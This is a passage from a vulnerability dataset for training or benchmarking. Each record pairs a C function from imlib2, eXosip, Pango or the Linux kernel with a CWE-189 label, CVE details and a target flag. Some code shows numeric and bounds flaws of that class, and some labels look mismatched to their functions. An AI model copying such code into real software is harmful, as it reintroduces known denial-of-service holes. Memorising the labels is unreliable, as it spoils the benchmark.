callign progress function */\n        ptr2 = im->data = malloc(w * h * sizeof(DATA32));\n        if (!im->data)\n           goto quit_error;\n\n        /* start reading the data */\n        switch (p)\n          {\n          case '1':            /* ASCII monochrome */\n             buf[0] = 0;\n             i = 0;\n             for (y = 0; y < h; y++)\n               {\n                  x = 0;\n                  while (x < w)\n                    {\n                       if (!buf[i])     /* fill buffer */\n                         {\n                            if (!fgets(buf, 255, f))\n                               goto quit_error;\n                            i = 0;\n                         }\n                       while (buf[i] && isspace(buf[i]))\n                          i++;\n                       if (buf[i])\n                         {\n                            if (buf[i] == '1')\n                               *ptr2 = 0xff000000;\n                            else if (buf[i] == '0')\n                               *ptr2 = 0xffffffff;\n                            else\n                               goto quit_error;\n                            ptr2++;\n                            i++;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '2':            /* ASCII greyscale */\n             idata = malloc(sizeof(int) * w);\n             if (!idata)\n                goto quit_error;\n\n             buf[0] = 0;\n             i = 0;\n             j = 0;\n             for (y = 0; y < h; y++)\n               {\n                  iptr = idata;\n                  x = 0;\n                  while (x < w)\n                    {\n                       int                 k;\n\n                       /* check 4 chars ahead to see if we need to\n                        * fill the buffer */\n                       for (k = 0; k < 4; k++)\n                         {\n                            if (!buf[i + k])    /* fill buffer */\n                              {\n                                 if (fseek(f, -k, SEEK_CUR) == -1 ||\n                                     !fgets(buf, 255, f))\n                                    goto quit_error;\n                                 i = 0;\n                                 break;\n                              }\n                         }\n                       while (buf[i] && isspace(buf[i]))\n                          i++;\n                       while (buf[i] && !isspace(buf[i]))\n                          buf2[j++] = buf[i++];\n                       if (j)\n                         {\n                            buf2[j] = 0;\n                            *(iptr++) = atoi(buf2);\n                            j = 0;\n                            x++;\n                          }\n                     }\n                   iptr = idata;\n                  if (v == 0 || v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (iptr[0] << 16) | (iptr[0] << 8)\n                               | iptr[0];\n                            ptr2++;\n                            iptr++;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((iptr[0] * 255) / v) << 16) |\n                               (((iptr[0] * 255) / v) << 8) |\n                               ((iptr[0] * 255) / v);\n                            ptr2++;\n                            iptr++;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '3':            /* ASCII RGB */\n             idata = malloc(3 * sizeof(int) * w);\n             if (!idata)\n                goto quit_error;\n\n             buf[0] = 0;\n             i = 0;\n             j = 0;\n             for (y = 0; y < h; y++)\n               {\n                  int                 w3 = 3 * w;\n\n                  iptr = idata;\n                  x = 0;\n                  while (x < w3)\n                    {\n                       int                 k;\n\n                       /* check 4 chars ahead to see if we need to\n                        * fill the buffer */\n                       for (k = 0; k < 4; k++)\n                         {\n                            if (!buf[i + k])    /* fill buffer */\n                              {\n                                 if (fseek(f, -k, SEEK_CUR) == -1 ||\n                                     !fgets(buf, 255, f))\n                                    goto quit_error;\n                                 i = 0;\n                                 break;\n                              }\n                         }\n                       while (buf[i] && isspace(buf[i]))\n                          i++;\n                       while (buf[i] && !isspace(buf[i]))\n                          buf2[j++] = buf[i++];\n                       if (j)\n                         {\n                            buf2[j] = 0;\n                            *(iptr++) = atoi(buf2);\n                            j = 0;\n                            x++;\n                          }\n                     }\n                   iptr = idata;\n                  if (v == 0 || v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (iptr[0] << 16) | (iptr[1] << 8)\n                               | iptr[2];\n                            ptr2++;\n                            iptr += 3;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((iptr[0] * 255) / v) << 16) |\n                               (((iptr[1] * 255) / v) << 8) |\n                               ((iptr[2] * 255) / v);\n                            ptr2++;\n                            iptr += 3;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '4':            /* binary 1bit monochrome */\n             data = malloc((w + 7) / 8 * sizeof(DATA8));\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, (w + 7) / 8, 1, f))\n                     goto quit_error;\n\n                  ptr = data;\n                  for (x = 0; x < w; x += 8)\n                    {\n                       j = (w - x >= 8) ? 8 : w - x;\n                       for (i = 0; i < j; i++)\n                         {\n                            if (ptr[0] & (0x80 >> i))\n                               *ptr2 = 0xff000000;\n                            else\n                               *ptr2 = 0xffffffff;\n                            ptr2++;\n                         }\n                       ptr++;\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '5':            /* binary 8bit grayscale GGGGGGGG */\n             data = malloc(1 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 1, 1, f))\n                      break;\n \n                   ptr = data;\n                  if (v == 0 || v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (ptr[0] << 16) | (ptr[0] << 8) |\n                               ptr[0];\n                            ptr2++;\n                            ptr++;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((ptr[0] * 255) / v) << 16) |\n                               (((ptr[0] * 255) / v) << 8) |\n                               ((ptr[0] * 255) / v);\n                            ptr2++;\n                            ptr++;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '6':            /* 24bit binary RGBRGBRGB */\n             data = malloc(3 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 3, 1, f))\n                      break;\n \n                   ptr = data;\n                  if (v == 0 || v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (ptr[0] << 16) | (ptr[1] << 8) |\n                               ptr[2];\n                            ptr2++;\n                            ptr += 3;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((ptr[0] * 255) / v) << 16) |\n                               (((ptr[1] * 255) / v) << 8) |\n                               ((ptr[2] * 255) / v);\n                            ptr2++;\n                            ptr += 3;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '7':            /* XV's 8bit 332 format */\n             data = malloc(1 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 1, 1, f))\n                     break;\n\n                  ptr = data;\n                  for (x = 0; x < w; x++)\n                    {\n                       int                 r, g, b;\n\n                       r = (*ptr >> 5) & 0x7;\n                       g = (*ptr >> 2) & 0x7;\n                       b = (*ptr) & 0x3;\n                       *ptr2 =\n                          0xff000000 |\n                          (((r << 21) | (r << 18) | (r << 15)) & 0xff0000) |\n                          (((g << 13) | (g << 10) | (g << 7)) & 0xff00) |\n                          ((b << 6) | (b << 4) | (b << 2) | (b << 0));\n                       ptr2++;\n                       ptr++;\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '8':            /* 24bit binary RGBARGBARGBA */\n             data = malloc(4 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 4, 1, f))\n                      break;\n \n                   ptr = data;\n                  if (v == 0 || v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               (ptr[3] << 24) | (ptr[0] << 16) |\n                               (ptr[1] << 8) | ptr[2];\n                            ptr2++;\n                            ptr += 4;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               (((ptr[3] * 255) / v) << 24) |\n                               (((ptr[0] * 255) / v) << 16) |\n                               (((ptr[1] * 255) / v) << 8) |\n                               ((ptr[2] * 255) / v);\n                            ptr2++;\n                            ptr += 4;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          default:\n           quit_error:\n             rc = 0;\n             break;\n           quit_progress:\n             rc = 2;\n             break;\n          }\n        if (idata)\n           free(idata);\n        if (data)\n           free(data);\n     }\n quit:\n   fclose(f);\n   return rc;\n}\n", "func_hash": 4455296634675838674960556975759038545, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9763", "cve_desc": "imlib2 before 1.4.7 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted PNM file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9763"}
{"idx": 158319, "project": "enlightment", "commit_id": "c94d83ccab15d5ef02f88d42dce38ed3f0892882", "project_url": "https://git.enlightenment.org/legacy/imlib2", "commit_url": "https://git.enlightenment.org/legacy/imlib2.git/commit/?id=c94d83ccab15d5ef02f88d42dce38ed3f0892882", "commit_message": "None", "target": 0, "func": "__imlib_Ellipse_DrawToData(int xc, int yc, int a, int b, DATA32 color,\n                           DATA32 * dst, int dstw, int clx, int cly, int clw,\n                           int clh, ImlibOp op, char dst_alpha, char blend)\n{\n   ImlibPointDrawFunction pfunc;\n   int                 xx, yy, x, y, prev_x, prev_y, ty, by, lx, rx;\n   DATA32              a2, b2, *tp, *bp;\n   DATA64              dx, dy;\n\n   if (A_VAL(&color) == 0xff)\n      blend = 0;\n   pfunc = __imlib_GetPointDrawFunction(op, dst_alpha, blend);\n   if (!pfunc)\n      return;\n\n   xc -= clx;\n   yc -= cly;\n   dst += (dstw * cly) + clx;\n\n   a2 = a * a;\n   b2 = b * b;\n\n   yy = b << 16;\n   prev_y = b;\n\n   dx = a2 * b;\n   dy = 0;\n\n   ty = yc - b - 1;\n   by = yc + b;\n   lx = xc - 1;\n   rx = xc;\n\n   tp = dst + (dstw * ty) + lx;\n   bp = dst + (dstw * by) + lx;\n\n   while (dy < dx)\n     {\n        int                 len;\n\n        y = yy >> 16;\n        y += ((yy - (y << 16)) >> 15);\n\n        if (prev_y != y)\n          {\n             prev_y = y;\n             dx -= a2;\n             ty++;\n             by--;\n             tp += dstw;\n             bp -= dstw;\n          }\n\n        len = rx - lx;\n\n        if (IN_RANGE(lx, ty, clw, clh))\n           pfunc(color, tp);\n        if (IN_RANGE(rx, ty, clw, clh))\n           pfunc(color, tp + len);\n        if (IN_RANGE(lx, by, clw, clh))\n           pfunc(color, bp);\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(color, bp + len);\n \n        if (dx < 1)\n           dx = 1;\n\n         dy += b2;\n         yy -= ((dy << 16) / dx);\n         lx--;\n\n        if ((lx < 0) && (rx > clw))\n           return;\n        if ((ty > clh) || (by < 0))\n           return;\n     }\n\n   xx = yy;\n   prev_x = xx >> 16;\n\n   dx = dy;\n\n   ty++;\n   by--;\n\n   tp += dstw;\n   bp -= dstw;\n\n   while (ty < yc)\n     {\n        int                 len;\n\n        x = xx >> 16;\n        x += ((xx - (x << 16)) >> 15);\n\n        if (prev_x != x)\n          {\n             prev_x = x;\n             dy += b2;\n             lx--;\n             rx++;\n             tp--;\n             bp--;\n          }\n\n        len = rx - lx;\n\n        if (IN_RANGE(lx, ty, clw, clh))\n           pfunc(color, tp);\n        if (IN_RANGE(rx, ty, clw, clh))\n           pfunc(color, tp + len);\n        if (IN_RANGE(lx, by, clw, clh))\n           pfunc(color, bp);\n        if (IN_RANGE(rx, by, clw, clh))\n           pfunc(color, bp + len);\n\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(color, bp + len);\n \n        if (dy < 1)\n           dy = 1;\n\n         dx -= a2;\n         xx += ((dx << 16) / dy);\n         ty++;\n        if ((ty > clh) || (by < 0))\n           return;\n     }\n}\n", "func_hash": 284104794435585416377253518082548721553, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2011-5326", "cve_desc": "imlib2 before 1.4.9 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) by drawing a 2x1 ellipse.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-5326"}
{"idx": 158374, "project": "savannah", "commit_id": "2549e421c14aff886629b8482c14af800f411070", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "http://git.savannah.nongnu.org/cgit/exosip.git/commit/?id=2549e421c14aff886629b8482c14af800f411070", "commit_message": "None", "target": 0, "func": "eXosip_init (struct eXosip_t *excontext)\n{\n  osip_t *osip;\n  int i;\n\n  memset (excontext, 0, sizeof (eXosip_t));\n\n  excontext->dscp = 0x1A;\n\n  snprintf (excontext->ipv4_for_gateway, 256, \"%s\", \"217.12.3.11\");\n  snprintf (excontext->ipv6_for_gateway, 256, \"%s\", \"2001:638:500:101:2e0:81ff:fe24:37c6\");\n\n#ifdef WIN32\n  /* Initializing windows socket library */\n  {\n    WORD wVersionRequested;\n    WSADATA wsaData;\n\n    wVersionRequested = MAKEWORD (1, 1);\n    i = WSAStartup (wVersionRequested, &wsaData);\n    if (i != 0) {\n      OSIP_TRACE (osip_trace (__FILE__, __LINE__, OSIP_WARNING, NULL, \"eXosip: Unable to initialize WINSOCK, reason: %d\\n\", i));\n      /* return -1; It might be already initilized?? */\n    }\n  }\n#endif\n\n  excontext->user_agent = osip_strdup (\"eXosip/\" EXOSIP_VERSION);\n  if (excontext->user_agent == NULL)\n    return OSIP_NOMEM;\n\n  excontext->j_calls = NULL;\n  excontext->j_stop_ua = 0;\n#ifndef OSIP_MONOTHREAD\n  excontext->j_thread = NULL;\n#endif\n  i = osip_list_init (&excontext->j_transactions);\n  excontext->j_reg = NULL;\n\n#ifndef OSIP_MONOTHREAD\n#if !defined (_WIN32_WCE)\n  excontext->j_cond = (struct osip_cond *) osip_cond_init ();\n  if (excontext->j_cond == NULL) {\n    osip_free (excontext->user_agent);\n    excontext->user_agent = NULL;\n    return OSIP_NOMEM;\n  }\n#endif\n\n  excontext->j_mutexlock = (struct osip_mutex *) osip_mutex_init ();\n  if (excontext->j_mutexlock == NULL) {\n    osip_free (excontext->user_agent);\n    excontext->user_agent = NULL;\n#if !defined (_WIN32_WCE)\n    osip_cond_destroy ((struct osip_cond *) excontext->j_cond);\n    excontext->j_cond = NULL;\n#endif\n    return OSIP_NOMEM;\n  }\n#endif\n\n  i = osip_init (&osip);\n  if (i != 0) {\n    OSIP_TRACE (osip_trace (__FILE__, __LINE__, OSIP_ERROR, NULL, \"eXosip: Cannot initialize osip!\\n\"));\n    return i;\n  }\n\n  osip_set_application_context (osip, &excontext);\n\n  _eXosip_set_callbacks (osip);\n\n  excontext->j_osip = osip;\n\n#ifndef OSIP_MONOTHREAD\n  /* open a TCP socket to wake up the application when needed. */\n  excontext->j_socketctl = jpipe ();\n  if (excontext->j_socketctl == NULL)\n    return OSIP_UNDEFINED_ERROR;\n\n  excontext->j_socketctl_event = jpipe ();\n  if (excontext->j_socketctl_event == NULL)\n    return OSIP_UNDEFINED_ERROR;\n#endif\n\n  /* To be changed in osip! */\n  excontext->j_events = (osip_fifo_t *) osip_malloc (sizeof (osip_fifo_t));\n  if (excontext->j_events == NULL)\n    return OSIP_NOMEM;\n  osip_fifo_init (excontext->j_events);\n\n  excontext->use_rport = 1;\n  excontext->dns_capabilities = 2;\n  excontext->enable_dns_cache = 1;\n  excontext->ka_interval = 17000;\n  snprintf(excontext->ka_crlf, sizeof(excontext->ka_crlf), \"\\r\\n\\r\\n\");\n  excontext->ka_options = 0;\n   excontext->autoanswer_bye = 1;\n   excontext->auto_masquerade_contact = 1;\n   excontext->masquerade_via=0;\n  excontext->use_ephemeral_port=1;\n \n   return OSIP_SUCCESS;\n }\n", "func_hash": 334860864183560227167682843878153050051, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-10375", "cve_desc": "handle_messages in eXtl_tls.c in eXosip before 5.0.0 mishandles a negative value in a content-length header.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-10375"}
{"idx": 158423, "project": "pango", "commit_id": "4de30e5500eaeb49f4bf0b7a07f718e149a2ed5e", "project_url": "http://github.com/bratsche/pango", "commit_url": "http://github.com/bratsche/pango/commit/4de30e5500eaeb49f4bf0b7a07f718e149a2ed5e", "commit_message": "[glyphstring] Handle overflow with very long glyphstrings", "target": 0, "func": "pango_glyph_string_set_size (PangoGlyphString *string, gint new_len)\n{\n  g_return_if_fail (new_len >= 0);\n\n   while (new_len > string->space)\n     {\n       if (string->space == 0)\n\t{\n\t  string->space = 4;\n\t}\n       else\n \t{\n\t  const guint max_space =\n\t    MIN (G_MAXINT, G_MAXSIZE / MAX (sizeof(PangoGlyphInfo), sizeof(gint)));\n\n\t  guint more_space = (guint)string->space * 2;\n\n\t  if (more_space > max_space)\n\t    {\n\t      more_space = max_space;\n\n\t      if ((guint)new_len > max_space)\n\t\t{\n\t\t  g_error (\"%s: failed to allocate glyph string of length %i\\n\",\n\t\t\t   G_STRLOC, new_len);\n\t\t}\n\t    }\n\n\t  string->space = more_space;\n \t}\n     }\n \n  string->glyphs = g_realloc (string->glyphs, string->space * sizeof (PangoGlyphInfo));\n  string->log_clusters = g_realloc (string->log_clusters, string->space * sizeof (gint));\n  string->num_glyphs = new_len;\n}\n", "func_hash": 105000942649568510308417598702037083919, "file_name": "glyphstring.c", "file_hash": 150455093204162127295659906057228748143, "cwe": ["CWE-189"], "cve": "CVE-2009-1194", "cve_desc": "Integer overflow in the pango_glyph_string_set_size function in pango/glyphstring.c in Pango before 1.24 allows context-dependent attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a long glyph string that triggers a heap-based buffer overflow, as demonstrated by a long document.location value in Firefox.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-1194"}
{"idx": 158432, "project": "linux", "commit_id": "8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664", "commit_message": "net: fix divide by zero in tcp algorithm illinois\n\nReading TCP stats when using TCP Illinois congestion control algorithm\ncan cause a divide by zero kernel oops.\n\nThe division by zero occur in tcp_illinois_info() at:\n do_div(t, ca->cnt_rtt);\nwhere ca->cnt_rtt can become zero (when rtt_reset is called)\n\nSteps to Reproduce:\n 1. Register tcp_illinois:\n     # sysctl -w net.ipv4.tcp_congestion_control=illinois\n 2. Monitor internal TCP information via command \"ss -i\"\n     # watch -d ss -i\n 3. Establish new TCP conn to machine\n\nEither it fails at the initial conn, or else it needs to wait\nfor a loss or a reset.\n\nThis is only related to reading stats.  The function avg_delay() also\nperforms the same divide, but is guarded with a (ca->cnt_rtt > 0) at its\ncalling point in update_params().  Thus, simply fix tcp_illinois_info().\n\nFunction tcp_illinois_info() / get_info() is called without\nsocket lock.  Thus, eliminate any race condition on ca->cnt_rtt\nby using a local stack variable.  Simply reuse info.tcpv_rttcnt,\nas its already set to ca->cnt_rtt.\nFunction avg_delay() is not affected by this race condition, as\nits called with the socket lock.\n\nCc: Petr Matousek <pmatouse@redhat.com>\nSigned-off-by: Jesper Dangaard Brouer <brouer@redhat.com>\nAcked-by: Eric Dumazet <edumazet@google.com>\nAcked-by: Stephen Hemminger <shemminger@vyatta.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static void tcp_illinois_info(struct sock *sk, u32 ext,\n\t\t\t      struct sk_buff *skb)\n{\n\tconst struct illinois *ca = inet_csk_ca(sk);\n\n\tif (ext & (1 << (INET_DIAG_VEGASINFO - 1))) {\n\t\tstruct tcpvegas_info info = {\n\t\t\t.tcpv_enabled = 1,\n \t\t\t.tcpv_rttcnt = ca->cnt_rtt,\n \t\t\t.tcpv_minrtt = ca->base_rtt,\n \t\t};\n \n\t\tif (info.tcpv_rttcnt > 0) {\n\t\t\tu64 t = ca->sum_rtt;\n \n\t\t\tdo_div(t, info.tcpv_rttcnt);\n\t\t\tinfo.tcpv_rtt = t;\n\t\t}\n \t\tnla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);\n \t}\n }\n", "func_hash": 265905920719259825673748213632149738414, "file_name": "tcp_illinois.c", "file_hash": 332081189501460947256009267484504104074, "cwe": ["CWE-189"], "cve": "CVE-2012-4565", "cve_desc": "The tcp_illinois_info function in net/ipv4/tcp_illinois.c in the Linux kernel before 3.4.19, when the net.ipv4.tcp_congestion_control illinois setting is enabled, allows local users to cause a denial of service (divide-by-zero error and OOPS) by reading TCP stats.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-4565"}
{"idx": 158484, "project": "linux", "commit_id": "20e0fa98b751facf9a1101edaefbc19c82616a68", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/20e0fa98b751facf9a1101edaefbc19c82616a68", "commit_message": "Fix length of buffer copied in __nfs4_get_acl_uncached\n\n_copy_from_pages() used to copy data from the temporary buffer to the\nuser passed buffer is passed the wrong size parameter when copying\ndata. res.acl_len contains both the bitmap and acl lenghts while\nacl_len contains the acl length after adjusting for the bitmap size.\n\nSigned-off-by: Sachin Prabhu <sprabhu@redhat.com>\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>", "target": 0, "func": "static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };\n\tstruct nfs_getaclargs args = {\n\t\t.fh = NFS_FH(inode),\n\t\t.acl_pages = pages,\n\t\t.acl_len = buflen,\n\t};\n\tstruct nfs_getaclres res = {\n\t\t.acl_len = buflen,\n\t};\n\tvoid *resp_buf;\n\tstruct rpc_message msg = {\n\t\t.rpc_proc = &nfs4_procedures[NFSPROC4_CLNT_GETACL],\n\t\t.rpc_argp = &args,\n\t\t.rpc_resp = &res,\n\t};\n\tint ret = -ENOMEM, npages, i, acl_len = 0;\n\n\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;\n\t/* As long as we're doing a round trip to the server anyway,\n\t * let's be prepared for a page of acl data. */\n\tif (npages == 0)\n\t\tnpages = 1;\n\n\tfor (i = 0; i < npages; i++) {\n\t\tpages[i] = alloc_page(GFP_KERNEL);\n\t\tif (!pages[i])\n\t\t\tgoto out_free;\n\t}\n\tif (npages > 1) {\n\t\t/* for decoding across pages */\n\t\tres.acl_scratch = alloc_page(GFP_KERNEL);\n\t\tif (!res.acl_scratch)\n\t\t\tgoto out_free;\n\t}\n\targs.acl_len = npages * PAGE_SIZE;\n\targs.acl_pgbase = 0;\n\t/* Let decode_getfacl know not to fail if the ACL data is larger than\n\t * the page we send as a guess */\n\tif (buf == NULL)\n\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;\n\tresp_buf = page_address(pages[0]);\n\n\tdprintk(\"%s  buf %p buflen %zu npages %d args.acl_len %zu\\n\",\n\t\t__func__, buf, buflen, npages, args.acl_len);\n\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),\n\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);\n\tif (ret)\n\t\tgoto out_free;\n\n\tacl_len = res.acl_len - res.acl_data_offset;\n\tif (acl_len > args.acl_len)\n\t\tnfs4_write_cached_acl(inode, NULL, acl_len);\n\telse\n\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,\n\t\t\t\t      acl_len);\n\tif (buf) {\n\t\tret = -ERANGE;\n \t\tif (acl_len > buflen)\n \t\t\tgoto out_free;\n \t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n\t\t\t\tacl_len);\n \t}\n \tret = acl_len;\n out_free:\n\tfor (i = 0; i < npages; i++)\n\t\tif (pages[i])\n\t\t\t__free_page(pages[i]);\n\tif (res.acl_scratch)\n\t\t__free_page(res.acl_scratch);\n\treturn ret;\n}\n", "func_hash": 256388573553531103653804341946158021308, "file_name": "nfs4proc.c", "file_hash": 10126859884048499971925131395599891848, "cwe": ["CWE-189"], "cve": "CVE-2012-2375", "cve_desc": "The __nfs4_get_acl_uncached function in fs/nfs/nfs4proc.c in the NFSv4 implementation in the Linux kernel before 3.3.2 uses an incorrect length variable during a copy operation, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words in an FATTR4_ACL reply.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-4131.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2375"}
{"idx": 158495, "project": "linux", "commit_id": "d50f2ab6f050311dbf7b8f5501b25f0bf64a439b", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/d50f2ab6f050311dbf7b8f5501b25f0bf64a439b", "commit_message": "ext4: fix undefined behavior in ext4_fill_flex_info()\n\nCommit 503358ae01b70ce6909d19dd01287093f6b6271c (\"ext4: avoid divide by\nzero when trying to mount a corrupted file system\") fixes CVE-2009-4307\nby performing a sanity check on s_log_groups_per_flex, since it can be\nset to a bogus value by an attacker.\n\n\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\n\tif (groups_per_flex < 2) { ... }\n\nThis patch fixes two potential issues in the previous commit.\n\n1) The sanity check might only work on architectures like PowerPC.\nOn x86, 5 bits are used for the shifting amount.  That means, given a\nlarge s_log_groups_per_flex value like 36, groups_per_flex = 1 << 36\nis essentially 1 << 4 = 16, rather than 0.  This will bypass the check,\nleaving s_log_groups_per_flex and groups_per_flex inconsistent.\n\n2) The sanity check relies on undefined behavior, i.e., oversized shift.\nA standard-confirming C compiler could rewrite the check in unexpected\nways.  Consider the following equivalent form, assuming groups_per_flex\nis unsigned for simplicity.\n\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\tif (groups_per_flex == 0 || groups_per_flex == 1) {\n\nWe compile the code snippet using Clang 3.0 and GCC 4.6.  Clang will\ncompletely optimize away the check groups_per_flex == 0, leaving the\npatched code as vulnerable as the original.  GCC keeps the check, but\nthere is no guarantee that future versions will do the same.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@vger.kernel.org", "target": 0, "func": "static int ext4_fill_flex_info(struct super_block *sb)\n{\n\tstruct ext4_sb_info *sbi = EXT4_SB(sb);\n \tstruct ext4_group_desc *gdp = NULL;\n \text4_group_t flex_group_count;\n \text4_group_t flex_group;\n\tunsigned int groups_per_flex = 0;\n \tsize_t size;\n \tint i;\n \n \tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tif (sbi->s_log_groups_per_flex < 1 || sbi->s_log_groups_per_flex > 31) {\n \t\tsbi->s_log_groups_per_flex = 0;\n \t\treturn 1;\n \t}\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n \n \t/* We allocate both existing and potentially added groups */\n \tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +\n\t\t\t((le16_to_cpu(sbi->s_es->s_reserved_gdt_blocks) + 1) <<\n\t\t\t      EXT4_DESC_PER_BLOCK_BITS(sb))) / groups_per_flex;\n\tsize = flex_group_count * sizeof(struct flex_groups);\n\tsbi->s_flex_groups = ext4_kvzalloc(size, GFP_KERNEL);\n\tif (sbi->s_flex_groups == NULL) {\n\t\text4_msg(sb, KERN_ERR, \"not enough memory for %u flex groups\",\n\t\t\t flex_group_count);\n\t\tgoto failed;\n\t}\n\n\tfor (i = 0; i < sbi->s_groups_count; i++) {\n\t\tgdp = ext4_get_group_desc(sb, i, NULL);\n\n\t\tflex_group = ext4_flex_group(sbi, i);\n\t\tatomic_add(ext4_free_inodes_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_inodes);\n\t\tatomic_add(ext4_free_group_clusters(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_clusters);\n\t\tatomic_add(ext4_used_dirs_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].used_dirs);\n\t}\n\n\treturn 1;\nfailed:\n\treturn 0;\n}\n", "func_hash": 118842164670602799055222836749851621520, "file_name": "super.c", "file_hash": 153991305486688530062822027651828903748, "cwe": ["CWE-189"], "cve": "CVE-2012-2100", "cve_desc": "The ext4_fill_flex_info function in fs/ext4/super.c in the Linux kernel before 3.2.2, on the x86 platform and unspecified other platforms, allows user-assisted remote attackers to trigger inconsistent filesystem-groups data and possibly cause a denial of service via a malformed ext4 filesystem containing a super block with a large FLEX_BG group size (aka s_log_groups_per_flex value).  NOTE: this vulnerability exists because of an incomplete fix for CVE-2009-4307.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2100"}
